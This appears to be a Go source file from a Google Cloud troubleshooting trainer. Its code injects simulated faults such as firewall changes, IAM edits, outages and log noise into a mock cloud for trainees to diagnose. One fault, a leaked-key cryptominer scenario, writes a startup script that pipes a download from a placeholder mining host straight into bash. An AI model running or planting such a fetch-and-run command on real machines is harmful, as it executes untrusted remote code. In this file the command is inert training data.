package scenario

import (
	"fmt"
	"sort"
	"strconv"
	"strings"

	"github.com/neodevesp/gcp-trainer/internal/cli"
	"github.com/neodevesp/gcp-trainer/internal/sim"
)

func fs(f Fault, k string) string {
	if v, ok := f[k]; ok && v != nil {
		return fmt.Sprint(v)
	}
	return ""
}

func fi(f Fault, k string, def int) int {
	if v := fs(f, k); v != "" {
		n, err := strconv.Atoi(v)
		if err == nil {
			return n
		}
	}
	return def
}

func fl(f Fault, k string) []string {
	var out []string
	switch v := f[k].(type) {
	case []any:
		for _, e := range v {
			out = append(out, fmt.Sprint(e))
		}
	case string:
		out = strings.Split(v, ",")
	}
	return out
}

// FaultTypes documents the supported declarative mutations.
var FaultTypes = []string{
	"command", "firewall_priority", "firewall_deny", "firewall_delete", "firewall_source", "route_delete", "nat_delete",
	"service_stop", "service_bind_localhost", "iam_remove", "iam_add", "run_env", "run_image", "run_secret_env",
	"run_iam_public", "sql_flag", "sql_slow_query", "sql_extra_connections", "vm_tag_remove", "vm_stop", "vm_metadata",
	"health_check_path", "named_port_remove", "mig_autoscaler", "bucket_public", "api_disable", "k8s_image",
	"k8s_remove_requests", "k8s_probe_port", "k8s_scale", "leaked_key_miner", "subnet_pga_off", "dns_record",
	"pubsub_push_endpoint", "secret_version_disable", "log_noise", "decoy_resource", "region_outage", "zone_outage", "bill_snapshot",
}

// ApplyFault mutates the world. Faults mutate real resource state, so symptoms
// (errors, logs, metrics) emerge from the simulation rather than being faked.
func ApplyFault(st *sim.State, project string, l *Lab, f Fault) error {
	p := st.Projects[project]
	actor := fs(f, "actor")
	if actor == "" {
		actor = "deploy-bot@" + project + ".iam.gserviceaccount.com"
	}
	audit := func(service, method, res string) {
		st.Audit(project, "serviceAccount:"+actor, service, method, res)
	}
	switch t := fs(f, "type"); t {
	case "command":
		s := cli.NewSession(st, project, AdminAccount)
		s.Region, s.Zone, s.NoTick = l.Region, l.Zone, true
		for k, v := range l.Files {
			s.Files[k] = v
		}
		if a := fs(f, "actor"); a != "" {
			// record the change under the actor's identity
			st.Org.IAM.AddBinding("roles/owner", "serviceAccount:"+a, nil)
			s = cli.NewSession(st, project, a)
			s.Region, s.Zone, s.NoTick = l.Region, l.Zone, true
		}
		s.Policy = PlatformPolicy
		return runScript(s, fs(f, "run"), "fault command")
	case "firewall_priority":
		fw := p.Firewalls[fs(f, "rule")]
		if fw == nil {
			return fmt.Errorf("firewall %s not found", fs(f, "rule"))
		}
		fw.Priority = fi(f, "priority", 900)
		audit("compute.googleapis.com", "v1.compute.firewalls.patch", "projects/"+project+"/global/firewalls/"+fw.Name)
	case "firewall_deny":
		fw := &sim.Firewall{Name: fs(f, "name"), Network: fs(f, "network"), Direction: "INGRESS", Priority: fi(f, "priority", 900), Action: "DENY",
			Rules: []sim.FWRule{{Protocol: "tcp", Ports: fl(f, "ports")}}, SourceRanges: fl(f, "sourceRanges"), SourceTags: fl(f, "sourceTags"), TargetTags: fl(f, "targetTags"), Description: fs(f, "description")}
		if fw.Network == "" {
			fw.Network = "default"
		}
		if len(fw.SourceRanges) == 0 && len(fw.SourceTags) == 0 {
			fw.SourceRanges = []string{"10.0.0.0/8"}
		}
		p.Firewalls[fw.Name] = fw
		audit("compute.googleapis.com", "v1.compute.firewalls.insert", "projects/"+project+"/global/firewalls/"+fw.Name)
	case "firewall_delete":
		delete(p.Firewalls, fs(f, "rule"))
		audit("compute.googleapis.com", "v1.compute.firewalls.delete", "projects/"+project+"/global/firewalls/"+fs(f, "rule"))
	case "firewall_source":
		fw := p.Firewalls[fs(f, "rule")]
		if fw == nil {
			return fmt.Errorf("firewall %s not found", fs(f, "rule"))
		}
		fw.SourceRanges = fl(f, "sourceRanges")
		fw.SourceTags = fl(f, "sourceTags")
		fw.TargetTags = append([]string{}, fl(f, "targetTags")...)
		audit("compute.googleapis.com", "v1.compute.firewalls.patch", "projects/"+project+"/global/firewalls/"+fw.Name)
	case "route_delete":
		for k, r := range p.Routes {
			if r.Network == fs(f, "network") && r.DestRange == fs(f, "dest") {
				delete(p.Routes, k)
				audit("compute.googleapis.com", "v1.compute.routes.delete", "projects/"+project+"/global/routes/"+k)
			}
		}
	case "nat_delete":
		r := p.Routers[fs(f, "router")]
		if r == nil {
			return fmt.Errorf("router %s not found", fs(f, "router"))
		}
		r.NATs = nil
		audit("compute.googleapis.com", "v1.compute.routers.patch", "projects/"+project+"/regions/"+r.Region+"/routers/"+r.Name)
	case "subnet_pga_off":
		sn := p.Subnets[fs(f, "subnet")]
		if sn == nil {
			return fmt.Errorf("subnet %s not found", fs(f, "subnet"))
		}
		sn.PrivateGoogleAccess = false
		audit("compute.googleapis.com", "v1.compute.subnetworks.setPrivateIpGoogleAccess", "projects/"+project+"/regions/"+sn.Region+"/subnetworks/"+sn.Name)
	case "service_stop":
		st.Extra["svc:"+project+"/"+fs(f, "vm")+"/"+fs(f, "service")] = "stopped"
	case "service_bind_localhost":
		vm := p.Instances[fs(f, "vm")]
		if vm == nil {
			return fmt.Errorf("vm %s not found", fs(f, "vm"))
		}
		vm.Metadata["sim-bind-"+fs(f, "port")] = "127.0.0.1"
	case "vm_tag_remove":
		vm := p.Instances[fs(f, "vm")]
		if vm == nil {
			return fmt.Errorf("vm %s not found", fs(f, "vm"))
		}
		var keep []string
		for _, tg := range vm.Tags {
			if tg != fs(f, "tag") {
				keep = append(keep, tg)
			}
		}
		vm.Tags = keep
		audit("compute.googleapis.com", "v1.compute.instances.setTags", "projects/"+project+"/zones/"+vm.Zone+"/instances/"+vm.Name)
	case "vm_stop":
		if vm := p.Instances[fs(f, "vm")]; vm != nil {
			vm.Status = "TERMINATED"
			audit("compute.googleapis.com", "v1.compute.instances.stop", "projects/"+project+"/zones/"+vm.Zone+"/instances/"+vm.Name)
		}
	case "vm_metadata":
		vm := p.Instances[fs(f, "vm")]
		if vm == nil {
			return fmt.Errorf("vm %s not found", fs(f, "vm"))
		}
		vm.Metadata[fs(f, "key")] = fs(f, "value")
		audit("compute.googleapis.com", "v1.compute.instances.setMetadata", "projects/"+project+"/zones/"+vm.Zone+"/instances/"+vm.Name)
	case "iam_remove", "iam_add":
		pol, err := policyFor(st, p, fs(f, "resource"))
		if err != nil {
			return err
		}
		if t == "iam_add" {
			pol.AddBinding(fs(f, "role"), fs(f, "member"), nil)
		} else {
			pol.RemoveBinding(fs(f, "role"), fs(f, "member"))
		}
		audit("cloudresourcemanager.googleapis.com", "SetIamPolicy", fs(f, "resource"))
	case "run_env", "run_secret_env":
		svc := p.RunServices[fs(f, "service")]
		if svc == nil {
			return fmt.Errorf("run service %s not found", fs(f, "service"))
		}
		if fs(f, "value") == "" {
			delete(svc.Env, fs(f, "key"))
		} else {
			svc.Env[fs(f, "key")] = fs(f, "value")
		}
		if t == "run_secret_env" {
			delete(svc.Secrets, fs(f, "key"))
		}
		audit("run.googleapis.com", "google.cloud.run.v1.Services.ReplaceService", "namespaces/"+project+"/services/"+svc.Name)
	case "run_image":
		svc := p.RunServices[fs(f, "service")]
		if svc == nil {
			return fmt.Errorf("run service %s not found", fs(f, "service"))
		}
		svc.Image = fs(f, "image")
		for i := range svc.Revisions {
			svc.Revisions[i].Traffic = 0
		}
		svc.Revisions = append(svc.Revisions, sim.Revision{Name: fmt.Sprintf("%s-%05d-rel", svc.Name, len(svc.Revisions)+1), Image: svc.Image, Env: svc.Env, Traffic: 100})
		audit("run.googleapis.com", "google.cloud.run.v1.Services.ReplaceService", "namespaces/"+project+"/services/"+svc.Name)
	case "run_iam_public":
		svc := p.RunServices[fs(f, "service")]
		if svc == nil {
			return fmt.Errorf("run service %s not found", fs(f, "service"))
		}
		svc.IAM.AddBinding("roles/run.invoker", "allUsers", nil)
		if ing := fs(f, "ingress"); ing != "" {
			svc.Ingress = ing
		}
		audit("run.googleapis.com", "google.cloud.run.v1.Services.SetIamPolicy", "projects/"+project+"/locations/"+svc.Region+"/services/"+svc.Name)
	case "sql_flag":
		in := p.SQLInstances[fs(f, "instance")]
		if in == nil {
			return fmt.Errorf("sql instance %s not found", fs(f, "instance"))
		}
		in.Flags[fs(f, "key")] = fs(f, "value")
	case "sql_slow_query":
		in := p.SQLInstances[fs(f, "instance")]
		if in == nil {
			return fmt.Errorf("sql instance %s not found", fs(f, "instance"))
		}
		in.SlowQueries = append(in.SlowQueries, fs(f, "query"))
	case "sql_extra_connections":
		in := p.SQLInstances[fs(f, "instance")]
		if in == nil {
			return fmt.Errorf("sql instance %s not found", fs(f, "instance"))
		}
		in.Flags["sim-extra-connections"] = fs(f, "count")
	case "health_check_path":
		hc := p.HealthChecks[fs(f, "name")]
		if hc == nil {
			return fmt.Errorf("health check %s not found", fs(f, "name"))
		}
		if v := fs(f, "path"); v != "" {
			hc.RequestPath = v
		}
		if v := fi(f, "port", 0); v != 0 {
			hc.Port = v
		}
		audit("compute.googleapis.com", "v1.compute.healthChecks.patch", "projects/"+project+"/global/healthChecks/"+hc.Name)
	case "named_port_remove":
		if ig := p.InstanceGroups[fs(f, "group")]; ig != nil {
			ig.NamedPorts = map[string]int{}
		}
	case "mig_autoscaler":
		ig := p.InstanceGroups[fs(f, "group")]
		if ig == nil || ig.Autoscaler == nil {
			return fmt.Errorf("autoscaled group %s not found", fs(f, "group"))
		}
		if v := fi(f, "min", -1); v >= 0 {
			ig.Autoscaler.Min = v
		}
		if v := fi(f, "max", -1); v >= 0 {
			ig.Autoscaler.Max = v
		}
		if v := fs(f, "targetCpu"); v != "" {
			ig.Autoscaler.TargetCPU, _ = strconv.ParseFloat(v, 64)
		}
		st.ResizeMIG(project, ig)
		audit("compute.googleapis.com", "v1.compute.autoscalers.patch", "projects/"+project+"/zones/"+ig.Zone+"/autoscalers/"+ig.Name)
	case "bucket_public":
		b, _ := st.FindBucket(fs(f, "bucket"))
		if b == nil {
			return fmt.Errorf("bucket %s not found", fs(f, "bucket"))
		}
		b.PAP = "inherited"
		b.IAM.AddBinding("roles/storage.objectViewer", "allUsers", nil)
		audit("storage.googleapis.com", "storage.setIamPermissions", "projects/_/buckets/"+b.Name)
	case "api_disable":
		p.Services[fs(f, "service")] = false
	case "k8s_image", "k8s_remove_requests", "k8s_probe_port", "k8s_scale":
		c := p.Clusters[fs(f, "cluster")]
		if c == nil || c.K8s == nil {
			return fmt.Errorf("cluster %s not found", fs(f, "cluster"))
		}
		ns := fs(f, "namespace")
		if ns == "" {
			ns = "default"
		}
		d := c.K8s.NS(ns).Deployments[fs(f, "deployment")]
		if d == nil || len(d.Template.Containers) == 0 {
			return fmt.Errorf("deployment %s not found", fs(f, "deployment"))
		}
		d.History = append(d.History, d.Template)
		tpl := d.Template
		cts := append([]sim.Container{}, tpl.Containers...)
		switch t {
		case "k8s_image":
			cts[0].Image = fs(f, "image")
		case "k8s_remove_requests":
			cts[0].Requests = sim.Resources{}
		case "k8s_probe_port":
			if cts[0].Readiness != nil {
				pr := *cts[0].Readiness
				pr.Port = fi(f, "port", 8081)
				cts[0].Readiness = &pr
			}
		case "k8s_scale":
			d.Replicas = fi(f, "replicas", 1)
		}
		tpl.Containers = cts
		d.Template = tpl
		d.Revision++
	case "leaked_key_miner":
		sa := fs(f, "serviceAccount")
		acct := p.ServiceAccounts[sa]
		if acct == nil {
			return fmt.Errorf("service account %s not found", sa)
		}
		acct.Keys = append(acct.Keys, sim.SAKey{ID: st.ID(40), Created: "2026-08-30T22:14:00Z", Leaked: true})
		zone := fs(f, "zone")
		name := fs(f, "vm")
		sn := p.SubnetForRegion("default", sim.RegionOf(zone))
		ip := ""
		if sn != nil {
			ip = st.AllocIP(sn.Range)
		}
		p.Instances[name] = &sim.Instance{Name: name, Zone: zone, MachineType: "n1-standard-8", Status: "RUNNING", Network: "default", Subnet: func() string {
			if sn != nil {
				return sn.Name
			}
			return ""
		}(), InternalIP: ip, ExternalIP: st.ExternalIP(), ServiceAccount: sa, Scopes: []string{"cloud-platform"}, Image: "ubuntu-2204-lts", GPUs: fi(f, "gpus", 4),
			Labels: map[string]string{"sim-cpu": "high"}, Metadata: map[string]string{"startup-script": "curl -s http://pool.minexmr.example/x.sh | bash"}, CreatedBy: "serviceAccount:" + sa}
		st.Audit(project, "serviceAccount:"+sa, "compute.googleapis.com", "v1.compute.instances.insert", "projects/"+project+"/zones/"+zone+"/instances/"+name)
		st.Log(project, sim.LogEntry{Severity: "NOTICE", LogName: "cloudaudit.googleapis.com%2Factivity", Resource: sim.LogResource{Type: "gce_instance"},
			Proto: map[string]string{"methodName": "v1.compute.instances.insert", "authenticationInfo.principalEmail": sa, "requestMetadata.callerIp": "185.220.101.7", "resourceName": "projects/" + project + "/zones/" + zone + "/instances/" + name}})
	case "dns_record":
		z := p.DNSZones[fs(f, "zone")]
		if z == nil {
			return fmt.Errorf("zone %s not found", fs(f, "zone"))
		}
		for i := range z.Records {
			if z.Records[i].Name == fs(f, "name") {
				z.Records[i].Data = fl(f, "data")
			}
		}
	case "pubsub_push_endpoint":
		sub := p.Subs[fs(f, "subscription")]
		if sub == nil {
			return fmt.Errorf("subscription %s not found", fs(f, "subscription"))
		}
		sub.PushEndpoint = fs(f, "endpoint")
	case "secret_version_disable":
		sec := p.Secrets[fs(f, "secret")]
		if sec == nil {
			return fmt.Errorf("secret %s not found", fs(f, "secret"))
		}
		for i := range sec.Versions {
			if strconv.Itoa(sec.Versions[i].ID) == fs(f, "version") {
				sec.Versions[i].State = "DISABLED"
			}
		}
	case "log_noise":
		// Irrelevant but alarming log lines (red herrings).
		for _, line := range fl(f, "lines") {
			st.Log(project, sim.LogEntry{Severity: fs(f, "severity"), LogName: "stderr", Resource: sim.LogResource{Type: fs(f, "resourceType"), Labels: map[string]string{}}, Text: line})
		}
	case "bill_snapshot":
		// Records the current estimate as last month's invoice (FinOps anomalies).
		st.SnapshotBill(project)
	case "region_outage", "zone_outage":
		where := fs(f, "region")
		if t == "zone_outage" {
			where = fs(f, "zone")
		}
		st.Extra["outage:"+where] = "down"
		st.Log(project, sim.LogEntry{Severity: "CRITICAL", LogName: "cloud-status", Resource: sim.LogResource{Type: "global"}, Text: "Google Cloud Status: multiple services unavailable in " + where})
	case "decoy_resource":
		// handled via setup commands; kept for documentation of intent
	default:
		known := append([]string{}, FaultTypes...)
		sort.Strings(known)
		return fmt.Errorf("unknown fault type %q (known: %s)", t, strings.Join(known, ", "))
	}
	return nil
}

func policyFor(st *sim.State, p *sim.Project, res string) (*sim.Policy, error) {
	kind, name, _ := strings.Cut(res, ":")
	switch kind {
	case "", "project":
		return &p.IAM, nil
	case "bucket":
		b, _ := st.FindBucket(name)
		if b == nil {
			return nil, fmt.Errorf("bucket %s not found", name)
		}
		return &b.IAM, nil
	case "secret":
		s := p.Secrets[name]
		if s == nil {
			return nil, fmt.Errorf("secret %s not found", name)
		}
		return &s.IAM, nil
	case "sa":
		s := p.ServiceAccounts[name]
		if s == nil {
			return nil, fmt.Errorf("service account %s not found", name)
		}
		return &s.IAM, nil
	case "run":
		s := p.RunServices[name]
		if s == nil {
			return nil, fmt.Errorf("run service %s not found", name)
		}
		return &s.IAM, nil
	case "dataset":
		d := p.Datasets[name]
		if d == nil {
			return nil, fmt.Errorf("dataset %s not found", name)
		}
		return &d.IAM, nil
	}
	return nil, fmt.Errorf("unknown IAM resource %q", res)
}
